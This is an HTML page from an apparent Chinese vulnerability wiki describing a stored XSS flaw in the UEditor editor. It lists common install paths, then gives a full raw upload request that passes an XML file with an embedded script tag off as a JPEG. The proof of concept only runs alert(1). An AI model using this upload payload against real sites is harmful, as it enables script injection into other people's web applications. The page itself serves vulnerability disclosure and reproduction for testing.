@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Ueditor/ueditor%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ueditor存在XSS漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ueditor\u5b58\u5728XSS\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2" },
+              {title: "\u4e09\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../ueditor%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28ASP%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../ueditor%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28ASP%29/" class="btn btn-xs btn-link">
+        ueditor存在任意文件上传漏洞(ASP)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ueditor%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ueditor%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        ueditor存在SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ueditorxss">ueditor存在XSS漏洞<a class="headerlink" href="#ueditorxss" title="Permanent link">&para;</a></h1>
+<h3 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>ueditor存在XSS漏洞</p>
+<h3 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><img alt="1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22.png" src="./img/35L9MfrjXp4PhD_k/1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22-134145.png" /></p>
+<h3 id="_3">三、漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>Ueditor路径：</p>
+<div class="highlight"><pre><span></span><code>/ueditor/
+/ueditor-1.4.3.3/net/
+/ueditor1_4_3_3-utf8-net/utf8-net/
+/utf8-net/
+</code></pre></div>
+<p>查看版本：</p>
+<div class="highlight"><pre><span></span><code>/ueditor/ueditor.all.js
+</code></pre></div>
+<p>首先点击上传附件，通过burp拦截，修改上传内容</p>
+<p><img alt="1724048797908-50f299b7-99a0-4cab-8ede-ea98be75892d.png" src="./img/35L9MfrjXp4PhD_k/1724048797908-50f299b7-99a0-4cab-8ede-ea98be75892d-144688.png" /></p>
+<div class="highlight"><pre><span></span><code>POST /ueditor/php/controller.php?action=uploadfile&amp;encode=utf-8 HTTP/1.1
+Host: 
+Content-Length: 886
+X_Requested_With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHZorABX70DBbzax
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;id&quot;
+
+WU_FILE_0
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;name&quot;
+
+phphello.jpg
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;type&quot;
+
+image/jpeg
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;lastModifiedDate&quot;
+
+Tue May 28 2024 11:33:15 GMT+0800 (香港标准时间)
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;size&quot;
+
+34
+------WebKitFormBoundaryNHZorABX70DBbzax
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;phphello.xml&quot;
+Content-Type: image/jpeg
+
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+alert(1);
+&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+------WebKitFormBoundaryNHZorABX70DBbzax--
+</code></pre></div>
+<p><img alt="1724076778474-6a6797d2-45dc-4bc3-897f-c16c48fc61e6.png" src="./img/35L9MfrjXp4PhD_k/1724076778474-6a6797d2-45dc-4bc3-897f-c16c48fc61e6-816298.png" /></p>
+<p><img alt="1724055830613-310f0ec5-83c7-490b-ac93-5b1cd5c9a244.png" src="./img/35L9MfrjXp4PhD_k/1724055830613-310f0ec5-83c7-490b-ac93-5b1cd5c9a244-554733.png" /></p>
+<blockquote>
+<p>更新: 2024-09-05 23:24:41<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/fn98g15xv4wqohvy">https://www.yuque.com/xiaokp7/ocvun2/fn98g15xv4wqohvy</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../ueditor%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28ASP%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../ueditor%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%28ASP%29/" class="btn btn-xs btn-link">
+        ueditor存在任意文件上传漏洞(ASP)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ueditor%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ueditor%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        ueditor存在SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
